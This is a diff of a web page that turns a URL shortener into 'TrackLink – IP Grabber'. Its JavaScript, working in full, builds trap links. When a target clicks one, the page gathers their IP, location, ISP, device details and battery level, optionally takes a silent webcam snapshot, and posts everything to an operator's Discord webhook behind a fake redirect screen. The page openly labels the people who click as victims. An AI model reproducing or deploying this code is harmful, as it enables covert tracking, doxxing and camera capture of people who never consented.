@@ -3,184 +3,208 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>ShrinkLink – Free URL Shortener</title>
+  <title>TrackLink – IP Grabber</title>
   <style>
-    :root { --bg: #0d0d0d; --fg: #00ff41; --acc: #00ff41; }
-    [data-theme="dark"] { --bg: #0d0d0d; --fg: #00ff41; --acc: #00ff41; }
-    body { margin:0; font-family: 'Courier New'; background:var(--bg); color:var(--fg); padding:20px; }
-    .card { background:#111; border:1px solid var(--acc); border-radius:12px; padding:20px; max-width:800px; margin:auto; box-shadow:0 0 20px #00ff4120; }
-    input, button { padding:12px; margin:8px 0; width:100%; border:1px solid var(--acc); background:#000; color:var(--fg); border-radius:8px; font-size:1rem; }
-    button { background:var(--acc); color:#000; cursor:pointer; font-weight:bold; transition:0.3s; }
-    button:hover { background:#00cc33; }
-    #generated { word-break:break-all; background:#000; padding:15px; border-radius:8px; margin:15px 0; }
-    #logs { margin-top:30px; }
-    .log { background:#000; padding:10px; margin:5px 0; border-left:4px solid var(--acc); font-size:0.9rem; }
-    .cam { width:120px; border:2px solid var(--acc); border-radius:8px; }
-    .footer { text-align:center; margin-top:50px; font-size:0.8rem; opacity:0.6; }
+    :root { --bg: #0a0a0a; --card: #111; --acc: #00ff41; --text: #e0e0e0; }
+    body { margin:0; font-family: 'Segoe UI', sans-serif; background:var(--bg); color:var(--text); padding:20px; }
+    .container { max-width:800px; margin:auto; }
+    .card { background:var(--card); border:2px solid var(--acc); border-radius:16px; padding:24px; margin-bottom:24px; box-shadow:0 0 30px rgba(0,255,65,0.2); }
+    h1 { margin:0 0 8px; color:var(--acc); font-size:1.8rem; }
+    p { margin:4px 0 16px; opacity:0.8; }
+    input, button { padding:14px; margin:8px 0; width:100%; border-radius:10px; font-size:1rem; }
+    input { background:#000; border:1px solid var(--acc); color:var(--text); }
+    button { background:var(--acc); color:#000; border:none; font-weight:bold; cursor:pointer; transition:0.2s; }
+    button:hover { background:#00cc33; transform:scale(1.02); }
+    #generated { background:#000; padding:16px; border-radius:10px; margin:16px 0; word-break:break-all; display:none; }
+    #shortlink { color:var(--acc); text-decoration:underline; font-weight:bold; }
+    .switch { position:relative; display:inline-block; width:50px; height:26px; margin-left:10px; }
+    .switch input { opacity:0; width:0; height:0; }
+    .slider { position:absolute; cursor:pointer; top:0; left:0; right:0; bottom:0; background:#333; transition:.3s; border-radius:34px; }
+    .slider:before { position:absolute; content:""; height:18px; width:18px; left:4px; bottom:4px; background:#fff; transition:.3s; border-radius:50%; }
+    input:checked + .slider { background:var(--acc); }
+    input:checked + .slider:before { transform:translateX(24px); }
+    #logs { margin-top:40px; }
+    .log { background:#000; padding:12px; margin:6px 0; border-left:4px solid var(--acc); border-radius:6px; font-size:0.9rem; }
+    .cam { width:100px; border:2px solid var(--acc); border-radius:8px; margin-top:6px; }
+    .footer { text-align:center; margin:50px 0 20px; font-size:0.8rem; opacity:0.5; }
   </style>
 </head>
 <body>
-  <div class="card">
-    <h1>ShrinkLink <span style="font-size:0.6em">⚡</span></h1>
-    <p>Shorten any link. Track every click. Zero ads.</p>
+  <div class="container">
+    <div class="card">
+      <h1>TrackLink <span style="font-size:0.7em">IP Grabber</span></h1>
+      <p>Generate a link. When someone clicks → get their IP, location, device & more.</p>
 
-    <input id="target" placeholder="https://youtube.com/watch?v=rickroll" />
-    <input id="webhook" placeholder="Discord webhook URL (kept private)" />
-    <label><input type="checkbox" id="cam" /> Steal webcam snapshot (silent)</label>
-    <button onclick="generate()">GENERATE TRAP LINK</button>
+      <input id="target" placeholder="https://youtube.com (real destination)" />
+      <input id="webhook" placeholder="https://discord.com/api/webhooks/..." />
 
-    <div id="generated" style="display:none">
-      <strong>Your trap:</strong><br>
-      <a id="shortlink" href="#" target="_blank"></a>
-      <button onclick="copy()" style="width:auto;padding:8px 15px;margin-top:10px;">Copy</button>
+      <div style="display:flex;align-items:center;margin:12px 0;">
+        <label><input type="checkbox" id="cam" /> Capture webcam (silent)</label>
+      </div>
+
+      <button onclick="generate()">GENERATE TRACKING LINK</button>
+
+      <div id="generated">
+        <strong>Send this link to your target:</strong><br>
+        <a id="shortlink" href="#" target="_blank"></a>
+        <button onclick="copyLink()" style="width:auto;padding:10px 16px;margin-top:10px;">Copy Link</button>
+      </div>
     </div>
 
-    <div id="logs">
-      <h2>Live Logs <span id="count">0</span></h2>
-      <button onclick="clearLogs()" style="width:auto;padding:8px 15px;">Clear</button>
+    <div class="card" id="logs">
+      <h2>Victim Logs <span id="count">0</span></h2>
+      <button onclick="clearLogs()" style="width:auto;padding:8px 16px;">Clear All</button>
       <div id="logbox"></div>
     </div>
   </div>
 
-  <div class="footer">© 2025 ShrinkLink – For educational purposes only 😉</div>
+  <div class="footer">© 2025 TrackLink – No mercy. No logs.</div>
 
   <script>
     const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
-    let logs = JSON.parse(localStorage.getItem("ratlogs") || "[]");
+    let logs = JSON.parse(localStorage.getItem("track_logs") || "[]");
     renderLogs();
 
     function randId() {
       let id = "";
-      for(let i=0;i<8;i++) id += chars[Math.floor(Math.random()*chars.length)];
+      for (let i = 0; i < 8; i++) id += chars[Math.floor(Math.random() * chars.length)];
       return id;
     }
 
-    async function generate() {
+    function generate() {
       const target = document.getElementById("target").value.trim();
       const webhook = document.getElementById("webhook").value.trim();
       const cam = document.getElementById("cam").checked;
 
-      if (!target || !webhook) return alert("Fill both boxes, boss.");
+      if (!target.startsWith("http")) return alert("Enter a valid URL (http/https)");
+      if (!webhook.includes("discord.com/api/webhooks")) return alert("Enter a valid Discord webhook");
 
       const id = randId();
       const short = `${location.origin}/r/${id}`;
-      
-      // Store trap config
-      localStorage.setItem(`trap_${id}`, JSON.stringify({target, webhook, cam}));
+
+      localStorage.setItem(`trap_${id}`, JSON.stringify({ target, webhook, cam }));
 
       document.getElementById("shortlink").href = short;
       document.getElementById("shortlink").innerText = short;
       document.getElementById("generated").style.display = "block";
     }
 
-    function copy() {
-      navigator.clipboard.writeText(document.getElementById("shortlink").href);
-      alert("Copied to clipboard. Go fish.");
+    function copyLink() {
+      const link = document.getElementById("shortlink").href;
+      navigator.clipboard.writeText(link);
+      alert("Link copied. Send it to your target.");
     }
 
-    // === LOG RENDER ===
     function renderLogs() {
       const box = document.getElementById("logbox");
       box.innerHTML = "";
-      logs.forEach(l => {
+      logs.slice().reverse().forEach(l => {
         const div = document.createElement("div");
         div.className = "log";
         div.innerHTML = `
-          <strong>${l.time}</strong> 👤 ${l.ip} (${l.city}, ${l.country})<br>
-          🎯 <a href="${l.target}" target="_blank">${l.target.slice(0,40)}...</a><br>
-          🌐 ${l.ua}<br>
+          <strong>${l.time}</strong><br>
+          <strong>IP:</strong> ${l.ip} (${l.city}, ${l.country})<br>
+          <strong>Device:</strong> ${l.ua.slice(0,60)}...<br>
+          <strong>Redirected to:</strong> <a href="${l.target}" target="_blank">${l.target.slice(0,50)}...</a><br>
           ${l.cam ? `<img class="cam" src="${l.cam}" />` : ""}
         `;
-        box.prepend(div);
+        box.appendChild(div);
       });
       document.getElementById("count").innerText = logs.length;
     }
 
     function clearLogs() {
       logs = [];
-      localStorage.setItem("ratlogs", "[]");
+      localStorage.setItem("track_logs", "[]");
       renderLogs();
     }
 
-    // === CATCH CLICKS (the /r/ trap) ===
+    // === TRACKING PAGE (when victim clicks /r/xyz123) ===
     if (location.pathname.startsWith("/r/")) {
       const id = location.pathname.slice(3);
       const config = JSON.parse(localStorage.getItem(`trap_${id}`) || "{}");
+
       if (!config.target) {
-        document.body.innerHTML = "<h1>404 – Link expired.</h1>";
-      } else {
-        (async () => {
-          // Grab everything
+        document.body.innerHTML = `<h1 style="color:#ff4444;text-align:center;margin-top:100px;">Link expired or invalid.</h1>`;
+        throw new Error("No trap");
+      }
+
+      (async () => {
+        try {
+          // Grab all victim data
           const ipData = await (await fetch("https://ipapi.co/json/")).json();
-          const ua = navigator.userAgent;
-          const camSnap = config.cam ? await grabCam() : null;
+          const battery = await navigator.getBattery?.() || { level: "N/A" };
+          const camSnap = config.cam ? await captureCam() : null;
 
           const payload = {
-            content: "**NEW VICTIM**",
             embeds: [{
-              title: "Click Tracked",
+              title: "NEW VICTIM CLICKED",
               color: 0x00ff41,
               fields: [
-                {name:"IP", value: ipData.ip, inline:true},
-                {name:"Location", value: `${ipData.city}, ${ipData.country_name}`, inline:true},
-                {name:"ISP", value: ipData.org, inline:true},
-                {name:"Device", value: ua.slice(0,80), inline:false},
-                {name:"Screen", value: `${screen.width}x${screen.height}`, inline:true},
-                {name:"Battery", value: (await navigator.getBattery()).level*100 + "%", inline:true},
-                {name:"Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline:true},
-                {name:"Redirect", value: config.target, inline:false}
+                { name: "IP", value: ipData.ip, inline: true },
+                { name: "Location", value: `${ipData.city}, ${ipData.country_name}`, inline: true },
+                { name: "ISP", value: ipData.org || "Unknown", inline: true },
+                { name: "Device", value: navigator.userAgent.slice(0,100), inline: false },
+                { name: "Screen", value: `${screen.width}x${screen.height}`, inline: true },
+                { name: "Battery", value: battery.level !== "N/A" ? Math.round(battery.level * 100) + "%" : "N/A", inline: true },
+                { name: "Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
+                { name: "Redirect", value: config.target, inline: false }
               ],
-              thumbnail: {url: camSnap || "https://i.imgur.com/removed.png"},
+              thumbnail: camSnap ? { url: camSnap } : null,
               timestamp: new Date().toISOString()
             }]
           };
 
-          // Send to webhook
-          fetch(config.webhook, {
+          // Send to Discord
+          await fetch(config.webhook, {
             method: "POST",
-            headers: {"Content-Type": "application/json"},
+            headers: { "Content-Type": "application/json" },
             body: JSON.stringify(payload)
           });
 
-          // Save to boss panel
-          const log = {
+          // Save to admin panel
+          const logEntry = {
             time: new Date().toLocaleString(),
             ip: ipData.ip,
             city: ipData.city,
             country: ipData.country_name,
-            ua,
+            ua: navigator.userAgent,
             target: config.target,
             cam: camSnap
           };
-          const all = JSON.parse(localStorage.getItem("ratlogs") || "[]");
-          all.push(log);
-          localStorage.setItem("ratlogs", JSON.stringify(all));
+          const allLogs = JSON.parse(localStorage.getItem("track_logs") || "[]");
+          allLogs.push(logEntry);
+          localStorage.setItem("track_logs", JSON.stringify(allLogs));
 
-          // Redirect victim
-          setTimeout(() => location.href = config.target, 500);
-        })();
-      }
+          // Redirect victim instantly
+          setTimeout(() => location.replace(config.target), 100);
+        } catch (e) {
+          location.replace(config.target);
+        }
+      })();
 
-      async function grabCam() {
+      async function captureCam() {
         try {
-          const stream = await navigator.mediaDevices.getUserMedia({video:true});
-          const vid = document.createElement("video");
-          vid.srcOb`ject = stream;
-          vid.play();
-          await new Promise(r => setTimeout(r, 1000));
+          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+          const video = document.createElement("video");
+          video.srcObject = stream;
+          video.play();
+          await new Promise(r => setTimeout(r, 800));
           const canvas = document.createElement("canvas");
           canvas.width = 320; canvas.height = 240;
-          canvas.getContext("2d").drawImage(vid,0,0,320,240);
-          stream.getTracks().forEach(t=>t.stop());
-          return canvas.toDataURL("image/jpeg",0.8);
-        } catch(e) { return null; }
+          canvas.getContext("2d").drawImage(video, 0, 0, 320, 240);
+          stream.getTracks().forEach(t => t.stop());
+          return canvas.toDataURL("image/jpeg", 0.7);
+        } catch (e) { return null; }
       }
 
-      // Fake loading page so victim doesn’t bail
-      document.body.innerHTML = `<div style="text-align:center;margin-top:100px;color:#00ff41;font-family:Courier">
-        <h1>Loading your link...</h1><p>Please wait 3 seconds</p>
-        <img src="https://i.imgur.com/removed.png" width="60" />
-      </div>`;
+      // Show fake loading screen
+      document.body.innerHTML = `
+        <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#000;display:flex;align-items:center;justify-content:center;flex-direction:column;color:#00ff41;font-family:monospace;">
+          <h2>Redirecting...</h2>
+          <p>Please wait a moment</p>
+        </div>
+      `;
     }
   </script>
 </body>
